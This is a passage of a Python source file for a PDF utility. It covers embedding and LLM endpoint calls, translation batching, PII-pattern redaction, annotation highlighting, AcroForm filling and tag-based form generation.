                    sw_words = s.split()
                    if len(sw_words) > max_words:
                        for k in range(0, len(sw_words), max_words):
                            units.append(" ".join(sw_words[k:k + max_words]))
                    else:
                        units.append(s.strip())
                buf, buf_n = [], 0
                for s in units:
                    sw = len(s.split())
                    if buf_n and buf_n + sw > max_words:
                        chunks.append({"page": p["page"], "text": " ".join(buf).strip()})
                        tail = " ".join(" ".join(buf).split()[-overlap_words:]) if overlap_words else ""
                        buf, buf_n = ([tail] if tail else []), len(tail.split())
                    buf.append(s.strip())
                    buf_n += sw
                if buf:
                    chunks.append({"page": p["page"], "text": " ".join(buf).strip()})
                continue
            if cur_n and cur_n + len(words) > max_words and cur_n >= min_words:
                flush()
                cur, cur_n = [], 0
            cur.append(par)
            cur_n += len(words)
        flush()
    return [c for c in chunks if c["text"].strip()]


def _embed_texts(texts, model=None, input_type=None):
    """Embed strings over an OpenAI-compatible /embeddings endpoint. Default is a LOCAL
    Ollama (OLLAMA_HOST — nothing leaves the machine); a configured PDFSTUDIO_EMBED_ENDPOINT
    (a base ending in /v1, e.g. NVIDIA NIM https://integrate.api.nvidia.com/v1) with a Bearer
    key is used instead. `input_type` ("query"/"passage") is sent when set — hosted embedders
    (NVIDIA nv-embed / nemotron) REQUIRE it; Ollama ignores it. Stdlib urllib only."""
    import urllib.request
    import urllib.error
    import json as _lj
    model = model or os.environ.get("PDFSTUDIO_EMBED_MODEL") or "nomic-embed-text"
    endpoint = os.environ.get("PDFSTUDIO_EMBED_ENDPOINT")
    api_key = os.environ.get("PDFSTUDIO_EMBED_API_KEY") or os.environ.get("NVIDIA_API_KEY")
    headers = {"content-type": "application/json"}
    if endpoint:
        url = endpoint.rstrip("/") + "/embeddings"
        if api_key:
            headers["Authorization"] = "Bearer " + api_key
    else:
        host = (os.environ.get("OLLAMA_HOST") or "http://localhost:11434").rstrip("/")
        if not host.startswith("http"):
            host = "http://" + host
        url = host + "/v1/embeddings"
    vecs = []
    for i in range(0, len(texts), 16):
        body = {"model": model, "input": texts[i:i + 16]}
        if input_type:
            body["input_type"] = input_type   # NVIDIA nv-embed / nemotron require query|passage
            body["truncate"] = "END"
        req = urllib.request.Request(url, data=_lj.dumps(body).encode("utf-8"), headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=300) as r:
                data = _lj.loads(r.read())
        except urllib.error.HTTPError as e:
            raise RuntimeError("embedding endpoint error %s at %s: %s (model %r)"
                               % (e.code, url, e.read().decode("utf-8", "replace")[:200], model))
        except urllib.error.URLError as e:
            raise RuntimeError("embedding endpoint not reachable at %s (%s) — start Ollama (`ollama serve`) "
                               "or set PDFSTUDIO_EMBED_ENDPOINT." % (url, getattr(e, "reason", e)))
        for item in (data.get("data") or []):
            vecs.append(item.get("embedding") or [])
    return vecs


def _embed_cached(docs, model=None, disabled=False, input_type=None):
    """Embed `docs`, reusing a per-document cache so a repeat search on the same PDF
    doesn't re-embed every chunk (the slow part). Cache key = the exact embedded
    strings + model + input_type; stored as JSON under .pdf-cache/semantic/ in the workflow
    dir (gitignored). Returns (vectors, cache_hit). `disabled` bypasses read+write."""
    import hashlib
    import json as _cj
    key = hashlib.sha256("|".join(docs + [str(model or ""), str(input_type or "")]).encode("utf-8")).hexdigest()[:24]
    cache_dir = os.path.join(os.getcwd(), ".pdf-cache", "semantic")
    cache_file = os.path.join(cache_dir, key + ".json")
    if not disabled:
        try:
            with open(cache_file, "r", encoding="utf-8") as f:
                cached = _cj.load(f)
            if isinstance(cached.get("vectors"), list) and len(cached["vectors"]) == len(docs):
                return cached["vectors"], True
        except Exception:  # noqa: BLE001 — a missing/corrupt cache just means recompute
            pass
    vecs = _embed_texts(docs, model, input_type=input_type)
    if not disabled:
        try:
            os.makedirs(cache_dir, exist_ok=True)
            with open(cache_file, "w", encoding="utf-8") as f:
                _cj.dump({"n": len(docs), "model": str(model or ""), "vectors": vecs}, f)
        except Exception:  # noqa: BLE001 — caching is best-effort
            pass
    return vecs, False


def _cosine(a, b):
    import math
    dot = sum(x * y for x, y in zip(a, b))
    na = math.sqrt(sum(x * x for x in a))
    nb = math.sqrt(sum(y * y for y in b))
    return (dot / (na * nb)) if na and nb else 0.0


# --- AI (summarize / translate) helpers -------------------------------------

def _doc_text(doc, max_chars):
    """Concatenate the document's page text up to max_chars (page-boundary aware)."""
    parts, total = [], 0
    for i in range(doc.page_count):
        t = (doc.load_page(i).get_text() or "").strip()
        if not t:
            continue
        parts.append(t)
        total += len(t)
        if total >= max_chars:
            break
    return "\n\n".join(parts)[:max_chars]


def _chunk_text(text, size):
    """Split text into <=size-char chunks on blank-line (paragraph) boundaries."""
    chunks, cur = [], ""
    for para in text.split("\n\n"):
        if cur and len(cur) + len(para) + 2 > size:
            chunks.append(cur)
            cur = ""
        cur = (cur + "\n\n" + para) if cur else para
        while len(cur) > size:  # a single huge paragraph — hard split
            chunks.append(cur[:size])
            cur = cur[size:]
    if cur.strip():
        chunks.append(cur)
    return chunks


def _llm_complete(prompt, model=None, system=None, max_tokens=1024):
    """Call an LLM and return its text. Endpoint is chosen from the environment
    (nothing is sent unless the extension's allowAiRequests gate let this op run):
      - ANTHROPIC_API_KEY set + a Claude model → Anthropic Messages API (cloud);
      - otherwise → an OpenAI-compatible endpoint at OLLAMA_HOST
        (default http://localhost:11434 — a LOCAL Ollama; nothing leaves the machine).
    Stdlib urllib only (no new dependency). Raises a clear error on failure."""
    import urllib.request
    import urllib.error
    import json as _lj
    key = os.environ.get("ANTHROPIC_API_KEY")
    model = model or os.environ.get("PDFSTUDIO_LLM_MODEL") or ("claude-haiku-4-5" if key else "llama3.1")
    if key and "claude" in model.lower():
        body = {"model": model, "max_tokens": int(max_tokens),
                "messages": [{"role": "user", "content": prompt}]}
        if system:
            body["system"] = system
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages", data=_lj.dumps(body).encode("utf-8"),
            headers={"content-type": "application/json", "x-api-key": key, "anthropic-version": "2023-06-01"})
        try:
            with urllib.request.urlopen(req, timeout=180) as r:
                data = _lj.loads(r.read())
            return "".join(b.get("text", "") for b in data.get("content", []) if b.get("type") == "text")
        except urllib.error.HTTPError as e:
            raise RuntimeError("Anthropic API error %s: %s" % (e.code, e.read().decode("utf-8", "replace")[:300]))
        except urllib.error.URLError as e:
            raise RuntimeError("Anthropic API unreachable: %s" % getattr(e, "reason", e))
    # OpenAI-compatible. A configured endpoint (PDFSTUDIO_LLM_ENDPOINT — a base ending in
    # /v1, e.g. NVIDIA NIM https://integrate.api.nvidia.com/v1) with a Bearer key wins;
    # otherwise a LOCAL Ollama at OLLAMA_HOST (keyless — nothing leaves the machine).
    endpoint = os.environ.get("PDFSTUDIO_LLM_ENDPOINT")
    api_key = os.environ.get("PDFSTUDIO_LLM_API_KEY") or os.environ.get("NVIDIA_API_KEY")
    headers = {"content-type": "application/json"}
    if endpoint:
        url = endpoint.rstrip("/") + "/chat/completions"
        if api_key:
            headers["Authorization"] = "Bearer " + api_key
    else:
        host = (os.environ.get("OLLAMA_HOST") or "http://localhost:11434").rstrip("/")
        if not host.startswith("http"):
            host = "http://" + host
        url = host + "/v1/chat/completions"
    messages = ([{"role": "system", "content": system}] if system else []) + [{"role": "user", "content": prompt}]
    body = {"model": model, "messages": messages, "stream": False, "max_tokens": int(max_tokens)}
    req = urllib.request.Request(url, data=_lj.dumps(body).encode("utf-8"), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            data = _lj.loads(r.read())
        return ((data.get("choices") or [{}])[0].get("message") or {}).get("content", "")
    except urllib.error.HTTPError as e:
        raise RuntimeError("LLM endpoint error %s at %s: %s (is model %r available?)"
                           % (e.code, url, e.read().decode("utf-8", "replace")[:200], model))
    except urllib.error.URLError as e:
        raise RuntimeError("LLM endpoint not reachable at %s (%s) — start Ollama (`ollama serve`), set "
                           "PDFSTUDIO_LLM_ENDPOINT / OLLAMA_HOST, or set ANTHROPIC_API_KEY." % (url, getattr(e, "reason", e)))


def _ai_invoice_starts(heads, model=None):
    """LLM-based invoice boundary detection: given each page's head text, ask the
    model which pages START a new invoice. Returns sorted 0-based start indices
    (page 0 always included). Raises on an unusable response (caller falls back)."""
    import json as _aj
    snips = ["[page %d]\n%s" % (i + 1, (h or "")[:350]) for i, h in enumerate(heads)]
    prompt = ("A single PDF concatenates several invoices/receipts. Below is the top text of each "
              "page. Identify which pages START a new invoice. Return ONLY JSON of the form "
              "{\"starts\": [1, 4, 7]} — 1-based page numbers, ascending, always including 1. No prose.\n\n"
              + "\n\n".join(snips))
    raw = _llm_complete(prompt, model=model,
                        system="You segment concatenated invoices. Output strict JSON only.", max_tokens=400)
    m = re.search(r"\{.*\}", raw or "", re.S)
    if not m:
        raise RuntimeError("AI detector returned no JSON")
    vals = (_aj.loads(m.group(0)).get("starts")) or []
    n = len(heads)
    starts = sorted({max(0, min(n - 1, int(s) - 1)) for s in vals if isinstance(s, (int, float))})
    if not starts or starts[0] != 0:
        starts = [0] + [s for s in starts if s != 0]
    return starts


# --- annotate helpers -------------------------------------------------------

def _parse_color(v, default=None):
    """Parse a color: '#RRGGBB', [r,g,b] in 0-1 or 0-255, else default. → (r,g,b) 0-1."""
    if v is None:
        return default
    if isinstance(v, str):
        s = v.strip().lstrip("#")
        if len(s) == 6:
            try:
                return tuple(int(s[i:i + 2], 16) / 255.0 for i in (0, 2, 4))
            except ValueError:
                return default
        return default
    if isinstance(v, (list, tuple)) and len(v) >= 3:
        try:
            vals = [float(x) for x in v[:3]]
        except (TypeError, ValueError):
            return default
        if any(x > 1.0 for x in vals):
            vals = [x / 255.0 for x in vals]
        return tuple(max(0.0, min(1.0, x)) for x in vals)
    return default


def _rect_bl(page, x, y, w, h):
    """OPW bottom-left [x,y,w,h] (points) → PyMuPDF top-left fitz.Rect."""
    import fitz
    hh = page.rect.height
    return fitz.Rect(x, hh - y - h, x + w, hh - y)


def _pt_bl(page, x, y):
    """OPW bottom-left [x,y] → PyMuPDF top-left fitz.Point."""
    import fitz
    return fitz.Point(x, page.rect.height - y)


def _translate_batch(batch, lang, model, max_tokens):
    """Translate a list of segments preserving 1:1 order. Sends the batch in one
    request separated by a delimiter; on a count mismatch, falls back to per-segment
    translation (robust but more calls). A single segment goes straight through."""
    if not batch:
        return []
    if len(batch) == 1:
        return [(_llm_complete(
            "Translate the following text to %s. Preserve meaning, tone and any Markdown "
            "structure. Output ONLY the translation, no preamble.\n\n%s" % (lang, batch[0]),
            model=model, system="You are a professional translator.",
            max_tokens=max_tokens) or "").strip()]
    delim = "@@@SEG@@@"
    joined = ("\n%s\n" % delim).join(batch)
    prompt = ("Translate each of the %d segments below to %s. Segments are separated by a "
              "line containing exactly `%s`. Return the %d translated segments in the same "
              "order, separated by the same `%s` delimiter line, and NOTHING else.\n\n%s" % (
                  len(batch), lang, delim, len(batch), delim, joined))
    resp = _llm_complete(prompt, model=model, system="You are a professional translator.",
                         max_tokens=max_tokens) or ""
    parts = [p.strip() for p in resp.split(delim)]
    if len(parts) == len(batch):
        return parts
    out = []  # fallback: translate each segment on its own
    for seg in batch:
        out.extend(_translate_batch([seg], lang, model, max_tokens))
    return out


def _translate_segments(segs, lang, model, max_tokens, chunk):
    """Translate many segments, batching them into <=chunk-char requests (order
    preserved). Returns a list parallel to `segs`."""
    out, batch, size = [], [], 0
    for s in segs:
        if batch and size + len(s) > chunk:
            out.extend(_translate_batch(batch, lang, model, max_tokens))
            batch, size = [], 0
        batch.append(s)
        size += len(s) + 12
    if batch:
        out.extend(_translate_batch(batch, lang, model, max_tokens))
    return out


def _lang_font(lang):
    """Pick a built-in font that can render the target script. PyMuPDF ships CJK
    fonts under reserved names; everything else falls back to Helvetica."""
    l = (lang or "").lower()
    if any(k in l for k in ("chinese", "mandarin", "zh", "中文", "简", "繁")):
        return "china-s"
    if any(k in l for k in ("japanese", "japan", "ja", "日本")):
        return "japan"
    if any(k in l for k in ("korean", "korea", "ko", "한국")):
        return "korea"
    return "helv"


def _fit_textbox(page, rect, text, fontname, size, rgb=(0, 0, 0)):
    """Cover `rect` with white and write `text` into it, shrinking the font until it
    fits (insert_textbox returns >=0 when the text fits the box). Returns True if it
    fit at some size, False if it had to clip at the 4pt floor."""
    size = max(4.0, float(size))
    for _ in range(10):
        page.draw_rect(rect, color=(1, 1, 1), fill=(1, 1, 1))
        try:
            rc = page.insert_textbox(rect, text, fontsize=size, fontname=fontname, color=rgb, align=0)
        except Exception:
            break
        if rc >= 0:
            return True
        size *= 0.85
        if size < 4:
            break
    page.draw_rect(rect, color=(1, 1, 1), fill=(1, 1, 1))
    try:
        page.insert_textbox(rect, text, fontsize=4, fontname=fontname, color=rgb, align=0)
    except Exception:
        pass
    return False


def _rasterize_doc(src, dpi):
    """Render every page to an image → a new image-only PDF. Nothing but the pixels
    survives: no text layer, form fields, annotations, metadata, layers, or off-page
    content. This is the "print to image" guarantee for a truly safe redaction."""
    import fitz
    out = fitz.open()
    downscales = []
    for pno in range(src.page_count):
        page = src.load_page(pno)
        pix, eff, down = _safe_pixmap(page, dpi)   # P0-1: never crash on an oversized page
        if down:
            downscales.append((pno + 1, eff))
        newp = out.new_page(width=page.rect.width, height=page.rect.height)
        newp.insert_image(newp.rect, pixmap=pix)
    return out, downscales


def _save_maybe_raster(doc, out_pdf, params):
    """Save `doc` to out_pdf; if params.rasterize is set, flatten to an image-only PDF
    first (belt-and-suspenders for redaction). Returns the dpi used, or 0 if not."""
    if params.get("rasterize") or params.get("flatten_to_image"):
        dpi = _clamp_dpi(params.get("dpi"))
        out, _ds = _rasterize_doc(doc, dpi)
        out.save(out_pdf, deflate=True)
        out.close()
        return dpi
    doc.save(out_pdf, garbage=3, deflate=True)
    return 0


# --- auto_redact matching: literal terms, whole-word, regex, PII presets --------

# Named PII patterns (heuristics — always verify with preview:true). Separators are
# required where a bare digit run would over-match (SSN/EIN), keeping false hits low.
_REDACT_PRESETS = {
    "ssn": r"\b\d{3}[-\s]\d{2}[-\s]\d{4}\b",
    "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
    "phone": r"(?<!\d)(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}(?!\d)",
    "credit_card": r"\b\d(?:[ -]?\d){12,18}\b",
    "ein": r"\b\d{2}-\d{7}\b",
    "ipv4": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
    "iban": r"\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b",
}


def _redact_specs(terms, regexes, presets, whole_word):
    """Build (label, regex_pattern) specs from literal terms, raw regexes and named
    PII presets. Literal terms are regex-escaped with flexible internal whitespace.
    Returns (specs, unknown_preset_names)."""
    import re
    specs, unknown = [], []
    for t in terms:
        # Escape each whitespace-separated token and rejoin with \s+ so the term
        # matches across variable spacing / line wraps in the reconstructed text.
        pat = r"\s+".join(re.escape(tok) for tok in re.split(r"\s+", t.strip()) if tok)
        if whole_word:
            pat = r"(?<![0-9A-Za-z])" + pat + r"(?![0-9A-Za-z])"
        specs.append((t, pat))
    for rgx in regexes:
        specs.append(("regex:%s" % rgx, rgx))
    for name in presets:
        pat = _REDACT_PRESETS.get(name)
        if pat:
            specs.append(("pattern:%s" % name, pat))
        else:
            unknown.append(name)
    return specs, unknown


def _page_text_spans(page):
    """Reconstruct a page's text with a char-offset -> word-rect map. Words on the
    same line join with a space; different lines are separated by a newline so a
    pattern match cannot span two visual lines. Returns (text, [(start,end,Rect)])."""
    import fitz
    parts, spans, pos, last = [], [], 0, None
    for w in page.get_text("words"):  # x0,y0,x1,y1, word, block, line, wordno
        key = (w[5], w[6]) if len(w) > 6 else None
        if last is not None:
            sep = " " if key == last else "\n"
            parts.append(sep)
            pos += len(sep)
        start = pos
        parts.append(w[4])
        pos += len(w[4])
        spans.append((start, pos, fitz.Rect(w[0], w[1], w[2], w[3])))
        last = key
    return "".join(parts), spans


def _page_redactions(page, specs, ignore_case):
    """Find every match of `specs` on the page. Returns [(label, matched_text,
    [Rect, ...]), ...] — rects are the word boxes the match overlaps."""
    import re
    text, spans = _page_text_spans(page)
    flags = re.IGNORECASE if ignore_case else 0
    out = []
    for label, pattern in specs:
        try:
            rx = re.compile(pattern, flags)
        except re.error:
            continue
        for m in rx.finditer(text):
            ms, me = m.start(), m.end()
            if me <= ms:
                continue
            rects = [r for (s, e, r) in spans if s < me and e > ms]
            if rects:
                out.append((label, m.group(0), rects))
    return out


# --- highlight: mark the matches instead of destroying them ---------------------

# The markup styles `highlight` supports, and the color each defaults to. Order is
# the one reported back in the error for an unknown style.
_HL_STYLES = ("highlight", "underline", "strikeout", "squiggly", "box")
_HL_COLORS = {
    "highlight": (1.0, 0.92, 0.23),   # highlighter yellow
    "underline": (0.13, 0.42, 0.86),  # blue
    "strikeout": (0.86, 0.15, 0.15),  # red
    "squiggly": (0.13, 0.42, 0.86),
    "box": (0.13, 0.42, 0.86),
}


def _line_bands(rects):
    """Group word rects into per-line unions. A match that wraps across two visual
    lines must become two boxes — one union over all of it would swallow the
    unrelated text between the line end and the line start."""
    import fitz
    bands = []
    for r in rects:
        for i, b in enumerate(bands):
            overlap = min(b.y1, r.y1) - max(b.y0, r.y0)
            if overlap > 0.5 * min(b.height, r.height):  # same line
                bands[i] = b | r
                break
        else:
            bands.append(fitz.Rect(r))
    return bands


# --- form filling: AcroForm widgets (text / checkbox / radio / dropdown) ---------

def _widget_on_states(w):
    """The non-Off export states a button widget can take (the values that turn it on)."""
    try:
        st = w.button_states() or {}
    except Exception:
        return []
    ons = []
    for k in ("normal", "down"):
        for s in (st.get(k) or []):
            if s and s != "Off" and s not in ons:
                ons.append(s)
    return ons


def _fill_widgets(doc, instructions):
    """Apply resolved field instructions to a document's widgets. Each instruction is
    {name, value, kind?, maxlen?} with kind "text" (default) | "check" (value is the
    on-state to enable; falsy/"Off" clears) | "choice" (dropdown export value).
    A field name may map to several widgets (a shared-name radio group). Returns
    {filled, unmatched, truncated}."""
    # Keep the page objects alive for the whole fill: widgets detach (and update()
    # silently no-ops) once their page is garbage-collected.
    pages = [doc.load_page(pno) for pno in range(doc.page_count)]
    index = {}
    for page in pages:
        for w in (page.widgets() or []):
            index.setdefault(w.field_name, []).append(w)
    filled, unmatched, truncated = 0, [], 0
    for ins in instructions:
        name, value = ins.get("name"), ins.get("value")
        kind = ins.get("kind") or "text"
        ws = index.get(name)
        if not ws:
            unmatched.append(name if kind == "text" else "%s=%s" % (name, value))
            continue
        if kind == "check":
            off = value in (None, "", "Off", False, 0)
            want = None if off else str(value)
            target = None
            if not off:
                for w in ws:
                    if want in _widget_on_states(w):
                        target = w
                        break
                if target is None and len(ws) == 1:  # simple checkbox: use its lone on-state
                    ons = _widget_on_states(ws[0])
                    target, want = ws[0], (ons[0] if ons else want)
            for w in ws:  # clear the whole group first (mutually-exclusive semantics)
                try:
                    w.field_value = "Off"
                    w.update()
                except Exception:
                    pass
            if off:
                filled += 1
            elif target is not None:
                try:
                    target.field_value = want
                    target.update()
                    filled += 1
                except Exception:
                    unmatched.append("%s=%s" % (name, value))
            else:
                unmatched.append("%s=%s" % (name, value))
        else:
            v = "" if value is None else str(value)
            ml = ins.get("maxlen") or 0
            if not ml:
                try:
                    ml = ws[0].text_maxlen or 0
                except Exception:
                    ml = 0
            if ml and len(v) > ml:
                v, _t = v[:ml], truncated
                truncated += 1
            for w in ws:
                try:
                    w.field_value = v
                    w.update()
                except Exception:
                    pass
            filled += 1
    return {"filled": filled, "unmatched": unmatched, "truncated": truncated}


def _apply_signature(doc, sig):
    """Stamp a signature image at a named field's rect or explicit coords. Visible image
    (not a cryptographic /Sig). Returns (ok, error)."""
    import fitz
    img = _safe_rel(sig.get("image"))
    if not img or not os.path.exists(img):
        return False, "image not found: %s" % sig.get("image")
    page_no = int(sig.get("page", 1)) - 1
    rect = None
    field = sig.get("field")
    if field:
        for pno in range(doc.page_count):
            for w in (doc.load_page(pno).widgets() or []):
                if w.field_name == field:
                    rect, page_no = w.rect, pno
                    break
            if rect is not None:
                break
    if rect is None and sig.get("rect"):
        r = sig["rect"]
        rect = fitz.Rect(r[0], r[1], r[0] + r[2], r[1] + r[3])
    if rect is None:
        return False, "needs a `field` or `rect`"
    try:
        doc.load_page(page_no).insert_image(rect, filename=img, keep_proportion=True, overlay=True)
        return True, None
    except Exception as e:  # noqa: BLE001
        return False, str(e)


def _line_chars(page):
    """Yield (line_text, metas) per visual LINE, where metas[i] describes character i:
    (rect, origin, size, color_int, font_name, span_flags).

    Line-scoped on purpose: replace_text matches within a line, never across a wrap. A match
    spanning two lines would union rects across the page and drop the replacement in the
    wrong place — the same reason auto_redact's helper separates lines with a newline.
    """
    import fitz

    for blk in page.get_text("rawdict").get("blocks", []):
        for ln in blk.get("lines", []):
            chars, metas = [], []
            for sp in ln.get("spans", []):
                size = sp.get("size", 11.0)
                color = sp.get("color", 0)
                font = sp.get("font", "")
                flags = sp.get("flags", 0)
                for ch in sp.get("chars", []):
                    chars.append(ch["c"])
                    metas.append((fitz.Rect(ch["bbox"]), ch.get("origin"), size, color, font, flags))
            if chars:
                yield "".join(chars), metas


def _map_replacement_font(font_name, span_flags, override):
    """Pick the base-14 font for replacement text.

    An embedded, subsetted original font cannot be reused for NEW glyphs — the subset only
    contains the characters the document already used. So substitution is inherent, and the
    honest goal is the closest base-14 look: span FLAGS say serif/mono/bold/italic more
    reliably than font names do (subset names look like "ABCDEF+Whatever"), with the name as
    a tiebreak.
    """
    if override and override != "auto":
        family = {"Helv": "he", "TiRo": "ti", "Cour": "co"}.get(override, "he")
    else:
        low = (font_name or "").lower()
        if span_flags & 8 or "courier" in low or "mono" in low or "consol" in low:
            family = "co"
        elif span_flags & 4 or "times" in low or "georgia" in low or "garamond" in low or "book" in low:
            family = "ti"
        else:
            family = "he"
    bold = bool(span_flags & 16) or "bold" in (font_name or "").lower()
    italic = bool(span_flags & 2) or "italic" in (font_name or "").lower() or "oblique" in (font_name or "").lower()
    table = {
        "he": ("helv", "hebo", "heit", "hebi"),
        "ti": ("tiro", "tibo", "tiit", "tibi"),
        "co": ("cour", "cobo", "coit", "cobi"),
    }[family]
    return table[(1 if bold else 0) + (2 if italic else 0)]


def _char_spans(page):
    """Reconstruct a page's text with a char-offset -> per-CHARACTER rect map.

    Deliberately NOT _page_text_spans(): that returns whole WORD boxes, and MuPDF splits
    words on whitespace only — so "[[full_name]]," is one word, comma included, and
    redacting its box would delete the user's punctuation. Anchoring needs character
    precision both to place the widget and to delete only the marker itself.

    Returns (text, [Rect per char]) — parallel, so text[i] is bounded by rects[i].
    """
    import fitz

    chars, rects = [], []
    for blk in page.get_text("rawdict").get("blocks", []):
        for ln in blk.get("lines", []):
            for sp in ln.get("spans", []):
                for ch in sp.get("chars", []):
                    chars.append(ch["c"])
                    rects.append(fitz.Rect(ch["bbox"]))
    return "".join(chars), rects


# A tag whose key is just a TYPE is anonymous: the author writes [[check]] at every checkbox
# and [[text]] at every blank, and create_form numbers them in reading order (check_01,
# check_02, …). That's the zero-effort path — no unique names to invent, no config file — and
# it's how you tag a 100-checkbox intake form without losing your mind. The field name still
# ends up in the PDF, so a filled copy still extracts to JSON/CSV keyed by check_01/text_03.
TYPE_TOKENS = {
    "text": "text",
    "textarea": "text",
    "check": "checkbox",
    "checkbox": "checkbox",
    "date": "date",
    "number": "number",
    "money": "money",
    "currency": "money",
    "phone": "phone",
    "ssn": "ssn",
    "zip": "zip",
    "sign": "signature",
    "signature": "signature",
}

# Typed text fields — date/money/phone/ssn/zip/number — are a TOOLTIP AND A LENGTH CAP.
# There is deliberately no JavaScript in a generated form. That decision was expensive, so
# here is the reasoning, to stop anyone (including me) re-litigating it:
#
# A PDF can only constrain typing with JavaScript, and every route was tried on a real form:
#
#   1. AFDate_KeystrokeEx('mm/dd/yyyy') — validates the finished entry. It REJECTED "7/9/26"
#      and threw it away: the value showed while you typed and vanished on blur. It destroyed
#      the user's data.
#   2. No script — "aa/bb/cc" sailed straight in.
#   3. A character filter on keystrokes — blocks letters, but "12/33/2023" is all legal
#      characters, so it cannot know day 33 doesn't exist.
#   4. A real date check at commit — works, but it is back to rejecting a finished entry, i.e.
#      one bad guess away from eating someone's answer again. And it only fires in viewers that
#      run form JS at all.
#
# Meanwhile enforcement is unreliable BY CONSTRUCTION: Chrome/Edge/Preview run little or no
# form JavaScript, and this product's own `sanitize` op strips what they do run. So the best
# case was "rejects some bad dates, in some viewers, until someone sanitizes the file" — bought
# with a real risk of silently deleting a correct answer.
#
# That trade is not worth it for an intake form a human reads. The right place to validate is
# the deterministic pipeline — `extract_form` sees every value on the way to JSON/CSV, runs the
# same everywhere, and cannot destroy anything a user typed. Validate there, not in the artifact.
#
# What's kept works in EVERY viewer and cannot fail: the tooltip states the expectation, and
# maxlen caps the length structurally (PDF 32000-1 /MaxLen).
#
#   type -> (tooltip hint, default maxlen)
FIELD_FORMATS = {
    "date": ("MM/DD/YYYY", 10),
    "number": ("numbers only", 0),
    "money": ("amount, e.g. 1,234.56", 0),
    "phone": ("phone number", 20),
    "ssn": ("SSN, 000-00-0000", 11),
    "zip": ("ZIP code", 10),
}


def _tag_regex(tag_syntax):
    """Build the marker pattern from a `tag` param like "[[key]]" or "<<key>>".

    The literal parts are regex-escaped (they're nearly always metacharacters); only the
    `key` placeholder becomes a capture. The key charset excludes "." on purpose: AcroForm
    treats a dot as a field-name HIERARCHY separator, so [[a.b]] would silently create a
    nested field. The 24-char cap is the prevention half of the wrap/clip guard — a long
    marker is the one that gets clipped in a narrow column. An optional |w=NNN sets the
    field width at the anchor, so the author can size a field without touching the YAML.
    """
    if "key" not in (tag_syntax or ""):
        raise ValueError('tag syntax must contain the literal token "key", e.g. "[[key]]"')
    head, _, tail = tag_syntax.partition("key")
    return re.compile(re.escape(head) + r"([A-Za-z0-9_]{1,24})(?:\|w=(\d{1,4}))?" + re.escape(tail))


def _orphan_fragments(text, rx):
    """Find marker debris: an opening/closing delimiter that isn't part of a complete tag.

    This is the whole point of the preflight. When a marker is too long for its column the
    renderer CLIPS it — "[[employee_home_address_lin" — so the tag regex finds nothing, no
    redaction happens, and the mangled literal ships inside the "form". Blank out every
    valid tag, then anything bracket-ish still standing is debris.
    """
    rest = rx.sub("", text)
    out = []
    for m in re.finditer(r"\[\[[^\[\]\n]{0,40}|[^\[\]\n]{0,40}\]\]", rest):
        frag = m.group(0).strip()
        if frag:
            out.append(frag)
    return out


def _union_rect(rects):
    """Union of per-char boxes = a tight anchor around the marker, punctuation untouched."""
    if not rects:
        return None
    r = +rects[0]
    for x in rects[1:]:
        r |= x
    return r


def _row_label(page, rect, own_rects, cell=None):
    """The text on the same table row as a field — its question, in other words.

    Anonymous tags ([[check]] → checkbox_23) are cheap to author but say nothing about what
    they mean, which would make a 117-field form unusable: you cannot tell checkbox_23 from
    checkbox_24. The document already says which is which, right beside the box, so harvest it
    into the field map.

    Scan the whole ROW (the cell's height), not the field's own line: a question that runs to
    two lines — or carries a footnote under it — puts the box's centre on the wrong line, and
    you'd label the field with the footnote. Ordered by line then x, or the lines interleave
    into word salad.
    """
    import fitz

    top, bot = (cell.y0, cell.y1) if cell is not None else (rect.y0, rect.y1)
    words = []
    for w in page.get_text("words"):
        wr = fitz.Rect(w[:4])
        mid = (wr.y0 + wr.y1) / 2.0
        if top - 1 <= mid <= bot + 1 and not any(wr.intersects(o) for o in own_rects):
            words.append((round(wr.y0, 1), wr.x0, w[4]))
    words.sort()
    return re.sub(r"\s+", " ", " ".join(t for _, _, t in words)).strip()[:120]


def _page_cells(page):
    """Table cell rects on the page, reconstructed from its border strokes.

    Most real forms are tables, and the cell — not the marker — is what a field should fill.
    The borders are drawn as separate line strokes (no rect contains the anchor), so ask
    PyMuPDF's table finder to rebuild them. Best-effort: no tables, or too old a PyMuPDF, just
    means `auto` falls back to the marker's own width.
    """
    import fitz

    try:
        tabs = page.find_tables()
    except Exception:  # noqa: BLE001 — needs PyMuPDF >= 1.23
        return []
    out = []
    for tb in tabs.tables:
        for c in tb.cells:
            if c:
                r = fitz.Rect(c)
                if r.width > 4 and r.height > 4:
                    out.append(r)
    return out


def _enclosing_cell(anchor, cells):
    """The smallest table cell containing the marker, if any."""
    inside = [c for c in cells if anchor in c]
    return min(inside, key=lambda r: r.get_area()) if inside else None


def _widget_rect(spec, anchor, page_rect, cells=()):
    """anchor + width/height/offset/align -> the widget rect.

    `auto` is resolved PER TYPE, not "the anchor's width": a checkbox anchored on
    "[[agree_to_policy]]" would otherwise be a ~100pt-wide bar (PyMuPDF honours whatever rect
    it's handed — it does not clamp), and a signature would be one 15pt line tall.

    For a text field, `auto` means FILL THE TABLE CELL when the marker sits in one. The marker
    is a placeholder — often deliberately tiny so it fits a narrow column — so its own width is
    meaningless as a field size; the cell is what the author actually drew.
    """
    import fitz

    typ = spec.get("type", "text")
    aw, ah = anchor.width, anchor.height
    pad = 1.5
    cell = _enclosing_cell(anchor, cells)
    if cell is not None and typ != "checkbox":
        aw = max(cell.width - 2 * pad - (anchor.x0 - cell.x0), 12.0)
        ah = max(min(cell.height - 2 * pad, 16.0), ah)
    w, h = spec.get("width", "auto"), spec.get("height", "auto")
    if typ == "checkbox":
        # Never the anchor's WIDTH (a "[[agree_to_policy]]" marker would give a ~100pt bar),
        # and never smaller than a box you can actually hit with a mouse: markers are often
        # set tiny on purpose so they fit a narrow column, which would otherwise yield a 6pt
        # checkbox. Word's own is ~11pt.
        side = max(10.0, min(ah, 14.0)) if w in (None, "auto") else float(w)
        w = h = side
    elif typ == "signature":
        w = max(aw, 150.0) if w in (None, "auto") else float(w)
        h = max(ah, 36.0) if h in (None, "auto") else float(h)
    else:
        w = aw if w in (None, "auto") else float(w)
